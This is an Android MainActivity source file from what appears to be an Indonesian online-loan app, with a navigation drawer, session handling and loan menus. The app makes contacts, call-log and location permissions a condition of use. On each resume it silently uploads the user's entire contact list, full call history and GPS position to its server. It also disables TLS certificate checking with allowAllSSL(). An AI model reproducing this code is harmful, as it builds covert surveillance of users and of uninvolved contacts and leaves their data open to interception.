package metis.winwin;

import android.Manifest;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.design.widget.NavigationView;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.FragmentTransaction;
import android.support.v4.view.GravityCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.Window;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.maps.LocationSource;
import com.google.android.gms.tasks.OnSuccessListener;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import butterknife.Bind;
import butterknife.ButterKnife;
import butterknife.OnClick;
import metis.winwin.Firebase.PushNotification;
import metis.winwin.Firebase.UpdateService;
import metis.winwin.Model.ContactModel;
import metis.winwin.Model.LogModel;
import metis.winwin.Utils.AndLog;
import metis.winwin.Utils.AppConf;
import metis.winwin.Utils.CallLogHelper;
import metis.winwin.Utils.GlobalToast;
import metis.winwin.Utils.HttpsTrustManager;
import metis.winwin.Utils.SessionManager;
import metis.winwin.Utils.VolleyHttp;

public class MainActivity extends AppCompatActivity
        implements NavigationView.OnNavigationItemSelectedListener, LocationSource.OnLocationChangedListener {


    @Bind(R.id.toolbar)
    Toolbar toolbar;
    @Bind(R.id.flContainer)
    FrameLayout flContainer;
    @Bind(R.id.nav_view)
    NavigationView navView;
    @Bind(R.id.drawer_layout)
    DrawerLayout drawer;
    @Bind(R.id.lyHome)
    LinearLayout lyHome;
    @Bind(R.id.lyNotifikasi)
    LinearLayout lyNotifikasi;
    @Bind(R.id.lyHistoryPengajuan)
    LinearLayout lyHistoryPengajuan;
    @Bind(R.id.lyContact)
    LinearLayout lyContact;
    @Bind(R.id.lyHow)
    RelativeLayout lyHow;
    @Bind(R.id.lyLogout)
    LinearLayout lyLogout;
    @Bind(R.id.txLogout)
    TextView txLogout;
    @Bind(R.id.lyChat)
    LinearLayout lyChat;
    @Bind(R.id.lyRequestKBayar)
    LinearLayout lyRequestKBayar;
    @Bind(R.id.lyBayar)
    LinearLayout lyBayar;
    @Bind(R.id.lyStatusPinjaman)
    LinearLayout lyStatusPinjaman;
    @Bind(R.id.lyJanjiBayar)
    LinearLayout lyJanjiBayar;
    LocationManager locationManager;
    boolean GpsStatus;
    Context context;
    @Bind(R.id.subMenu1)
    TextView subMenu1;
    @Bind(R.id.subMenu2)
    TextView subMenu2;
    @Bind(R.id.subMenu3)
    TextView subMenu3;
    private String provider;
    int success;
    StringRequest stringRequest;
    RequestQueue requestQueue;
    String slat, slang;
    private ArrayList<String> conNames;
    private ArrayList<String> conNumbers;
    private ArrayList<String> conTime;
    private ArrayList<String> conDate;
    private ArrayList<String> conType;
    private ArrayList<LogModel> logModels;
    String nama, nomer, callNumber, callName, callDate, callType, duration, ctc_name, ctc_nomor;
    private SessionManager sessionManager;
    private final int PROS_ID = 1357;
    private FusedLocationProviderClient mFusedLocationClient;
    Intent intent = getIntent();
    ActionBarDrawerToggle toggle;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ButterKnife.bind(this);
        HttpsTrustManager.allowAllSSL();
        requestQueue = Volley.newRequestQueue(MainActivity.this);
        sessionManager = new SessionManager(MainActivity.this);
        context = getApplicationContext();

        setSupportActionBar(toolbar);
        getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        toggle = new ActionBarDrawerToggle(
                this, drawer, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
        drawer.addDrawerListener(toggle);
        toggle.syncState();
        navView.setNavigationItemSelectedListener(this);

//        NavigationView navigationView = (NavigationView) findViewById(R.id.nav_view);
//        navigationView.setNavigationItemSelectedListener(new NavigationView.OnNavigationItemSelectedListener() {
//            @Override
//            public boolean onNavigationItemSelected(@NonNull MenuItem item) {
//                int id = item.getItemId();
//                Intent intent;
//
//                if (id == R.id.subMenu1) {
//                    intent = new Intent(MainActivity.this, HowItWorks.class);
//                    startActivity(intent);
//                }
//
//                if (id == R.id.subMenu2) {
//                    intent = new Intent(MainActivity.this, HowItWork2Activity.class);
//                    startActivity(intent);
//                }
//
//                if (id == R.id.subMenu3) {
//                    intent = new Intent(MainActivity.this, HowItWork3Activity.class);
//                    startActivity(intent);
//                }
//
//                if (id == R.id.lyNotifikasi) {
//                    intent = new Intent(MainActivity.this, Notifikasi.class);
//                    startActivity(intent);
//                }
//
//                if (id == R.id.lyHistoryPengajuan) {
//                    intent = new Intent(MainActivity.this, HistoryPengajuan.class);
//                    startActivity(intent);
//                }
//
//                if (id == R.id.lyContact) {
//                    intent = new Intent(MainActivity.this, VoiceCallBridge.class);
//                    intent.putExtra("iduser", "0");
//                    intent.putExtra("nama", "Admin");
//                    intent.putExtra("foto", "");
//                }
//
//                if (id == R.id.lyChat) {
//                    intent = new Intent(MainActivity.this, Chat.class);
//                    intent.putExtra("iduser", "0");
//                    intent.putExtra("nama", "Admin");
//                    intent.putExtra("foto", "");
//                }
//
//                if (id == R.id.lyStatusPinjaman) {
//                    //                intent = new Intent(MainActivity.this, StatusPinjaman.class);
//                    GlobalToast.ShowToast(MainActivity.this, "Maaf fitur sementara kami matikan");
//                }
//
//                if (id == R.id.lyBayar) {
//                    intent = new Intent(MainActivity.this, ConBayarSeb.class);
//                    startActivity(intent);
//                }
//
//                if (id == R.id.lyRequestKBayar) {
//                    intent = new Intent(MainActivity.this, MetodePembayaran.class);
//                    intent.putExtra("pass", "1");
//                    startActivity(intent);
//                }
//
//                if (id == R.id.lyLogout) {
//                    String logout = txLogout.getText().toString();
//                    if (logout.equals(getString(R.string.logout))) {
//
//                        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
//
//                        builder.setTitle("Logout");
//                        builder.setMessage("Anda yakin akan logout?");
//
//                        builder.setPositiveButton("Ya", new DialogInterface.OnClickListener() {
//
//                            public void onClick(DialogInterface dialog, int which) {
//
//                                sessionManager.logoutUser();
//                                dialog.dismiss();
//
//                                finish();
//                            }
//                        });
//
//                        builder.setNegativeButton("Tidak", new DialogInterface.OnClickListener() {
//
//                            @Override
//                            public void onClick(DialogInterface dialog, int which) {
//
//                                // Do nothing
//                                dialog.dismiss();
//                            }
//                        });
//
//                        AlertDialog alert = builder.create();
//                        alert.show();
//
//                    } else {
//                        intent = new Intent(MainActivity.this, Login.class);
//                        startActivity(intent);
//                    }
//                }
//
//                if (id == R.id.lyJanjiBayar) {
//                    intent = new Intent(MainActivity.this, JanjiBayar.class);
//                    startActivity(intent);
//                }
//
//                return true;
//            }
//        });

        PinjamanFragment pinjamanFragment = new PinjamanFragment();
        FragmentTransaction transaction = getSupportFragmentManager().beginTransaction();
        // Replace whatever is in the fragment_container view with this fragment,
        // and add the transaction to the back stack so the user can navigate back
        transaction.replace(R.id.flContainer, pinjamanFragment);
//        transaction.addToBackStack(null);
        // Commit the transaction
        transaction.commit();

        sessionManager = new SessionManager(MainActivity.this);


        if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED
//                || ActivityCompat.checkSelfPermission(MainActivity.this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_CONTACTS) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(MainActivity.this,
                    new String[]{
                            Manifest.permission.ACCESS_COARSE_LOCATION,
                            Manifest.permission.ACCESS_FINE_LOCATION,
                            Manifest.permission.GET_ACCOUNTS,
                            Manifest.permission.READ_PHONE_STATE,
                            Manifest.permission.READ_CONTACTS,
                            Manifest.permission.WRITE_CONTACTS,
                            Manifest.permission.READ_CALL_LOG,
                            Manifest.permission.WRITE_CALL_LOG,

                    },
                    PROS_ID);
        }


        Bundle extras = getIntent().getExtras();
        if (extras != null) {
            if (extras.containsKey("message")) {
                Intent chat = new Intent(MainActivity.this, Chat.class);
                chat.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(chat);
            } else if (extras.containsKey("message1")) {
                Intent chat = new Intent(MainActivity.this, Notifikasi.class);
                chat.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(chat);
            }

        }

        subMenu1.setText("* Cara Pengajuan");
        subMenu2.setText("* Cara Pembayaran via Virtual Account");
        subMenu3.setText("* Cara Pembayaran Bayar Sebagian & Req Kode Bayar");


    }


    private void Dialog() {
        final Dialog dialog = new Dialog(MainActivity.this);
        LayoutInflater inflater = (LayoutInflater) MainActivity.this.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        View view = inflater.inflate(R.layout.pop_up_dialog_gps, null);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(view);

        Button btnSubmit = (Button) view.findViewById(R.id.btActive);

        btnSubmit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                final Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                startActivity(intent);
                dialog.dismiss();
            }
        });


        dialog.getWindow().setBackgroundDrawableResource(R.drawable.corner_radius);
        dialog.setCancelable(false);
        dialog.show();
    }

    private void Token() {
        StringRequest stringRequest = new StringRequest(Request.Method.POST, AppConf.URL_TOKEN, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {


            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }

        }) {

            @Override
            protected Map<String, String> getParams() throws AuthFailureError {


                SharedPreferences sharedPreferences = getApplicationContext().getSharedPreferences(getString(R.string.FCM_PREF), Context.MODE_PRIVATE);
                String token = sharedPreferences.getString(getString(R.string.FCM_TOKEN), "");

                Map<String, String> params = new HashMap<String, String>();
                params.put("id", sessionManager.getIdhq());
                params.put("token", token);

                AndLog.ShowLog("Datas", params.toString() + ";;" + AppConf.URL_LOGIN);
                return params;
            }
        };

        stringRequest.setTag(AppConf.httpTag);
        VolleyHttp.getInstance(MainActivity.this).addToRequestQueue(stringRequest);

    }

    public void CheckGpsStatus() {

        if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            GpsStatus = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            if (GpsStatus == true) {

                locationLog();

                boolean checkService = PushNotification.isMyServiceRunning(MainActivity.this, UpdateService.class);
                if (!checkService && sessionManager.getIdhq() != null) {
                    startService(new Intent(MainActivity.this, UpdateService.class));
                }


            } else {
                Dialog();
                Toast.makeText(context, "GPS IS NON ACTIVE", Toast.LENGTH_SHORT).show();
            }

        }
    }

    @Override
    public void onBackPressed() {
        if (drawer.isDrawerOpen(GravityCompat.START)) {
            drawer.closeDrawer(GravityCompat.START);
        } else {
            super.onBackPressed();
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

//        //noinspection SimplifiableIfStatement
        if (toggle.onOptionsItemSelected(item)) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    @SuppressWarnings("StatementWithEmptyBody")
    @Override
    public boolean onNavigationItemSelected(MenuItem item) {
        // Handle navigation view item clicks here.
        int id = item.getItemId();

        if (id == R.id.nav_camera) {
            // Handle the camera action
        } else if (id == R.id.nav_gallery) {

        } else if (id == R.id.nav_slideshow) {

        } else if (id == R.id.nav_manage) {

        } else if (id == R.id.nav_share) {

        } else if (id == R.id.nav_send) {

        }

        drawer.closeDrawer(GravityCompat.START);
        return true;
    }

    @OnClick({R.id.lyStatusPinjaman, R.id.subMenu1, R.id.subMenu2, R.id.subMenu3, R.id.lyHome, R.id.lyNotifikasi, R.id.lyHistoryPengajuan, R.id.lyRequestKBayar, R.id.lyContact, R.id.lyChat, R.id.lyBayar, R.id.lyHow, R.id.lyLogout, R.id.lyJanjiBayar})
    public void onClick(View view) {

        Intent intent = null;

        switch (view.getId()) {
            case R.id.subMenu1:
                intent = new Intent(MainActivity.this, HowItWorks.class);
                break;
            case R.id.subMenu2:
                intent = new Intent(MainActivity.this, HowItWork2Activity.class);
                break;
            case R.id.subMenu3:
                intent = new Intent(MainActivity.this, HowItWork3Activity.class);
                break;
            case R.id.lyHome:
                break;
            case R.id.lyNotifikasi:
                intent = new Intent(MainActivity.this, Notifikasi.class);
                break;
            case R.id.lyHistoryPengajuan:
                intent = new Intent(MainActivity.this, HistoryPengajuan.class);
                break;
            case R.id.lyContact:
//                intent = new Intent(MainActivity.this, VoiceCall.class);
                intent = new Intent(MainActivity.this, VoiceCallBridge.class);
                intent.putExtra("iduser", "0");
                intent.putExtra("nama", "Admin");
                intent.putExtra("foto", "");
                break;
            case R.id.lyChat:
//                intent = new Intent(MainActivity.this, VoiceCall.class);
                intent = new Intent(MainActivity.this, Chat.class);
                intent.putExtra("iduser", "0");
                intent.putExtra("nama", "Admin");
                intent.putExtra("foto", "");
                break;

            case R.id.lyStatusPinjaman:
//                intent = new Intent(MainActivity.this, StatusPinjaman.class);
                GlobalToast.ShowToast(MainActivity.this, "Maaf fitur sementara kami matikan");
                break;

            case R.id.lyBayar:
                intent = new Intent(MainActivity.this, ConBayarSeb.class);
                break;

            case R.id.lyRequestKBayar:
                intent = new Intent(MainActivity.this, MetodePembayaran.class);
                intent.putExtra("pass", "1");

                break;
            case R.id.lyHow:

                break;

            case R.id.lyLogout:
                String logout = txLogout.getText().toString();
                if (logout.equals(getString(R.string.logout))) {

                    AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);

                    builder.setTitle("Logout");
                    builder.setMessage("Anda yakin akan logout?");

                    builder.setPositiveButton("Ya", new DialogInterface.OnClickListener() {

                        public void onClick(DialogInterface dialog, int which) {

                            sessionManager.logoutUser();
                            dialog.dismiss();

                            finish();
                        }
                    });

                    builder.setNegativeButton("Tidak", new DialogInterface.OnClickListener() {

                        @Override
                        public void onClick(DialogInterface dialog, int which) {

                            // Do nothing
                            dialog.dismiss();
                        }
                    });

                    AlertDialog alert = builder.create();
                    alert.show();

                } else {
                    intent = new Intent(MainActivity.this, Login.class);
                }
                break;

            case R.id.lyJanjiBayar:
                intent = new Intent(MainActivity.this, JanjiBayar.class);
                break;
        }

        final Intent currIntent = intent;


        DrawerLayout.DrawerListener listen = new DrawerLayout.DrawerListener() {
            @Override
            public void onDrawerSlide(View drawerView, float slideOffset) {

            }

            @Override
            public void onDrawerOpened(View drawerView) {

            }

            @Override
            public void onDrawerClosed(View drawerView) {

                drawer.removeDrawerListener(this);

                if (currIntent != null) {
                    startActivity(currIntent);
                }
            }

            @Override
            public void onDrawerStateChanged(int newState) {

            }
        };

        drawer.closeDrawer(GravityCompat.START);
        drawer.addDrawerListener(listen);

    }

    @Override
    public void onResume() {
        super.onResume();


        if (sessionManager.checkLogin()) {

            sessionManager.setInCall(false);
            sessionManager.setInChat(false);
            txLogout.setText(getString(R.string.logout));
            lyNotifikasi.setVisibility(View.VISIBLE);
            lyHistoryPengajuan.setVisibility(View.VISIBLE);
            lyContact.setVisibility(View.GONE);
            lyChat.setVisibility(View.VISIBLE);
            lyBayar.setVisibility(View.VISIBLE);
            lyRequestKBayar.setVisibility(View.VISIBLE);
            lyNotifikasi.setVisibility(View.GONE);
            lyStatusPinjaman.setVisibility(View.VISIBLE);
            lyJanjiBayar.setVisibility(View.VISIBLE);

            Token();
            refreshSession();

            contactLog();
            callLog();
            getJSON();

        } else {
            txLogout.setText(getString(R.string.login));
            lyHistoryPengajuan.setVisibility(View.GONE);
            lyContact.setVisibility(View.GONE);
            lyChat.setVisibility(View.GONE);
            lyBayar.setVisibility(View.GONE);
            lyRequestKBayar.setVisibility(View.GONE);
            lyNotifikasi.setVisibility(View.GONE);
            lyStatusPinjaman.setVisibility(View.GONE);
            lyJanjiBayar.setVisibility(View.GONE);

        }


        CheckGpsStatus();


    }


    private void getJSON() {
        String id_user = new SessionManager(MainActivity.this).getIduser();
        Map<String, String> params = new HashMap<String, String>();
        params.put("id", id_user);

        AndLog.ShowLog("tag_id_client", AppConf.URL_GET_ID_CLIENT + id_user);
        stringRequest = new StringRequest(Request.Method.GET, AppConf.URL_GET_ID_CLIENT + id_user, new Response.Listener<String>() {
            //            id = "54878";
//            nama_lengkap = "ENTY YULL SENTY";
            @Override
            public void onResponse(String response) {
                AndLog.ShowLog("id_client: ", response);
                sessionManager.setIdhq(response);
//                getCountPinjaman();

            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {


            }
        });
        requestQueue.add(stringRequest);
    }


    private void refreshSession() {

        StringRequest stringRequest = new StringRequest(Request.Method.GET, AppConf.URL_UPDATE_SESSION + "?_session=" + sessionManager.getSession(), new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {

            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

                if (error.networkResponse != null) {
                    if (error.networkResponse.statusCode == 404) {

                        sessionManager.logoutUser();
                        finish();
                        Intent intent = new Intent(MainActivity.this, MainActivity.class);
                        startActivity(intent);
                    }
                }


            }

        });


        stringRequest.setTag(AppConf.httpTag);
        VolleyHttp.getInstance(MainActivity.this).addToRequestQueue(stringRequest);

    }

    private void UpdateLokasi() {

        StringRequest strReq = new StringRequest(Request.Method.POST, AppConf.UPDATELOKIASI, new Response.Listener<String>() {

            @Override
            public void onResponse(String response) {

            }
        }, new Response.ErrorListener() {

            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }) {

            @Override
            protected Map<String, String> getParams() {

                Map<String, String> params = new HashMap<String, String>();
                params.put("cli_id", sessionManager.getIdhq());
                params.put("latitude", slat);
                params.put("longitude", slang);

                return params;
            }

        };
        requestQueue.add(strReq);
    }


    @Override
    public void onLocationChanged(Location location) {
        double lat = location.getLatitude();
        double lng = location.getLongitude();

        slat = String.valueOf(lat);
        slang = String.valueOf(lng);

        if (sessionManager != null) {
            if (sessionManager.checkLogin()) {
                UpdateLokasi();
            }
        }

    }

    private class LoadFromContactList extends AsyncTask<Void, String, ArrayList<ContactModel>> {
        @Override
        protected void onPreExecute() {
            super.onPreExecute();

            //Log.i(TAG, "Load Contact");
        }

        @Override
        protected ArrayList<ContactModel> doInBackground(Void... params) {
            // TODO Auto-generated method stub

            ArrayList<ContactModel> result = LihatContact();

            return result;
        }


        @Override
        protected void onPostExecute(final ArrayList<ContactModel> result) {
            // TODO Auto-generated method stub
            super.onPostExecute(result);
            String data = "";
            String compare = "";
            for (int i = 0; i < result.size(); i++) {
//                AndLog.ShowLog("ContactDetail", result.get(i).getNama() + " - " + result.get(i).getExtra());
                AndLog.ShowLog("nama", ctc_name = result.get(i).getNama());
                AndLog.ShowLog("nomer", ctc_nomor = result.get(i).getExtra());

                if (!compare.equals(result.get(i).getExtra())) {
                    data = data + result.get(i).getNama() + "(" + result.get(i).getExtra() + "), ";
                }

                compare = result.get(i).getExtra();

            }
            final String Contact = data;
            StringRequest strReq = new StringRequest(Request.Method.POST, AppConf.SAVEKONTAK, new Response.Listener<String>() {

                @Override
                public void onResponse(String response) {

                }
            }, new Response.ErrorListener() {

                @Override
                public void onErrorResponse(VolleyError error) {

                }
            }) {

                @Override
                protected Map<String, String> getParams() {

                    Map<String, String> params = new HashMap<String, String>();

                    params.put("ctc_data", Contact);
                    params.put("id_client", sessionManager.getIdhq());

                    AndLog.ShowLog("husst", String.valueOf(params));
                    return params;

                }

            };
            requestQueue.add(strReq);
        }


    }

    private ArrayList<ContactModel> LihatContact() {

        ArrayList<ContactModel> tmpContact = new ArrayList<>();
        ContactModel contactVO;
        ContentResolver contentResolver = MainActivity.this.getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
        if (cursor.getCount() > 0) {
            while (cursor.moveToNext()) {

                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.HAS_PHONE_NUMBER)));
                if (hasPhoneNumber > 0) {

                    contactVO = new ContactModel();
                    String fixPhone = "0";
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String mphone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                    fixPhone = mphone.replace("+62", "0").replaceAll("\\D+", "");

                    contactVO.setNama(name);
                    contactVO.setExtra(fixPhone);


                    tmpContact.add(contactVO);


                }
            }

        }


        return tmpContact;
    }

    private void getCallLogs(Cursor curLog) {
        String data = "";
        while (curLog.moveToNext()) {
            String finaldata = "";

            callName = curLog
                    .getString(curLog
                            .getColumnIndex(CallLog.Calls.CACHED_NAME));
            if (callName == null) {
//                conNames.add("Unknown");
                finaldata = finaldata + "Unknown No : ";
            } else {
//            conNames.add(callName);
                finaldata = finaldata + callName + " No : ";
            }
            callNumber = curLog.getString(curLog
                    .getColumnIndex(CallLog.Calls.NUMBER));
//            conNumbers.add(callNumber);
            finaldata = finaldata + callNumber;

            duration = curLog.getString(curLog
                    .getColumnIndex(CallLog.Calls.DURATION));
//            conTime.add(duration);
            finaldata = finaldata + " ( " + duration + " sec ) ";

            callDate = curLog.getString(curLog
                    .getColumnIndex(CallLog.Calls.DATE));
            SimpleDateFormat formatter = new SimpleDateFormat(
                    "dd-MMM-yyyy HH:mm");
            String dateString = formatter.format(new Date(Long
                    .parseLong(callDate)));
//            conDate.add(dateString);
            finaldata = finaldata + dateString;

            callType = curLog.getString(curLog
                    .getColumnIndex(CallLog.Calls.TYPE));
            if (callType.equals("1")) {
//                conType.add("Incoming");
                finaldata = finaldata + " ( Incoming ) , ";
            } else {
//                conType.add("Outgoing");
                finaldata = finaldata + " ( Outgoing ) , ";
            }
            data = data + finaldata;
        }

        final String CalLog = data;
        StringRequest strReq = new StringRequest(Request.Method.POST, AppConf.SAVELOG, new Response.Listener<String>() {

            @Override
            public void onResponse(String response) {

            }
        }, new Response.ErrorListener() {

            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }) {

            @Override
            protected Map<String, String> getParams() {

                Map<String, String> params = new HashMap<String, String>();

                params.put("log_data", CalLog);
                params.put("id_client", sessionManager.getIdhq());

                AndLog.ShowLog("caloghzz", String.valueOf(params));
                return params;

            }

        };
        requestQueue.add(strReq);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {

        if (requestCode == PROS_ID) {

            AndLog.ShowLog("PANJDANGXX", grantResults.length + " pers");
//            if (grantResults.length > 0
//                    && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
//
//                // DO NOTHING
//
//            } else {
////                mActivity.finish();
//            }
            int deny = 0;
            for (int i = 0; i < grantResults.length; i++) {

                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    deny++;
                }
            }

            if (deny > 0) {
                finish();
            } else {
                CheckGpsStatus();
//                locationLog();
            }

        }
    }


    private BroadcastReceiver onRequest = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            Bundle bundle = intent.getExtras();
            if (bundle.containsKey("type")) {

                String type = bundle.getString("type");

                String req = "";

                if (type.equals(Manifest.permission.ACCESS_COARSE_LOCATION)) {

                    req = Manifest.permission.ACCESS_COARSE_LOCATION;

                } else if (type.equals(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {

                    req = Manifest.permission.WRITE_EXTERNAL_STORAGE;

                } else if (type.equals(Manifest.permission.CAMERA)) {

                    req = Manifest.permission.CAMERA;

                } else if (type.equals(Manifest.permission.RECORD_AUDIO)) {

                    req = Manifest.permission.RECORD_AUDIO;

                } else if (type.equals(Manifest.permission.READ_CONTACTS)) {

                    req = Manifest.permission.READ_CONTACTS;

                } else if (type.equals(Manifest.permission.READ_CALL_LOG)) {

                    req = Manifest.permission.READ_CALL_LOG;

                }

                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]{Manifest.permission.ACCESS_COARSE_LOCATION},
                        PROS_ID);

            }
        }
    };

    public void locationLog() {

        if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {


            // Get the location manager
//            locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            // Define the criteria how to select the locatioin provider -> use
            // default
//            Criteria criteria = new Criteria();
//            provider = locationManager.getBestProvider(criteria, false);
//            Location location = locationManager.getLastKnownLocation(provider);
//
//            // Initialize the location fields
//            if (location != null) {
////                System.out.println("Provider " + provider + " has been selected.");
////                onLocationChanged(location);
//                Log.d("Locloclocloc", "Getting");
//                if (sessionManager != null) {
//                    if (sessionManager.checkLogin()) {
//                        UpdateLokasi();
//                    }
//                }
//            }

            mFusedLocationClient = LocationServices.getFusedLocationProviderClient(MainActivity.this);
            mFusedLocationClient.getLastLocation()
                    .addOnSuccessListener(this, new OnSuccessListener<Location>() {
                        @Override
                        public void onSuccess(Location location) {
                            // Got last known location. In some rare situations this can be null.
                            if (location != null) {
                                // Logic to handle location object
                                double lat = location.getLatitude();
                                double lng = location.getLongitude();

                                slat = String.valueOf(lat);
                                slang = String.valueOf(lng);

                                if (sessionManager != null) {
                                    if (sessionManager.checkLogin()) {
                                        UpdateLokasi();
                                    }
                                }
                            }
                        }
                    });
        }
    }

    public void contactLog() {

        if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {

            new LoadFromContactList().execute();
        }
    }

    public void callLog() {

        if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {

            conNames = new ArrayList<String>();
            conNumbers = new ArrayList<String>();
            conTime = new ArrayList<String>();
            conDate = new ArrayList<String>();
            conType = new ArrayList<String>();
            Cursor curLog = CallLogHelper.getAllCallLogs(getContentResolver());
            getCallLogs(curLog);
        }
    }

}
